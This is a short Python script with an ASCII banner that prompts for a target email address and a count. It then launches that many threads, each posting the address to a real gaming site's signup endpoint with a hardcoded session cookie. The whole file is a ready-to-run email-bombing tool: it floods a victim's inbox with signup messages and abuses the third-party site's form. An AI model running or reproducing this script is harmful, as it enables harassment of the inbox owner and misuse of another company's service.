import requests
import threading
import colorama

print("""
╭━━╮╭━━━┳━━━┳╮╭━┳━━━┳━╮╱╭╮
┃╭╮┃┃╭━╮┃╭━╮┃┃┃╭┫╭━━┫┃╰╮┃┃
┃╰╯╰┫╰━╯┃┃╱┃┃╰╯╯┃╰━━┫╭╮╰╯┃
┃╭━╮┃╭╮╭┫┃╱┃┃╭╮┃┃╭━━┫┃╰╮┃┃
┃╰━╯┃┃┃╰┫╰━╯┃┃┃╰┫╰━━┫┃╱┃┃┃
╰━━━┻╯╰━┻━━━┻╯╰━┻━━━┻╯╱╰━╯
""")

email = input("\033[1;32mEMAIL ADDRESS\033[1;37m : \033[0;32m")
number = int(input("\033[1;32mNUMBER TO SEND\033[1;37m : \033[0;32m"))

def attack():
    r = requests.post("https://au.moveongame.com/member/joinemaildo.php",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","cookie": "PHPSESSID=j922t8983np33nj6fksqgmni1a; _gid=GA1.2.225604557.1663439851; _gat_gtag_UA_135083014_2=1; _gcl_au=1.1.1202866844.1663439858; _ga_PBYDNCGKP0=GS1.1.1663439858.1.0.1663439858.0.0.0; _ga=GA1.2.1627370588.1663439851","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36","x-requested-with": "XMLHttpRequest"},data=f"signup-email={email}")
    if r.status_code == 200:
        print("\033[32mSEND TO EMAIL")
    else:
        print("\033[32mERROR 404")
        
for i in range(number):
    threading.Thread(target=attack).start()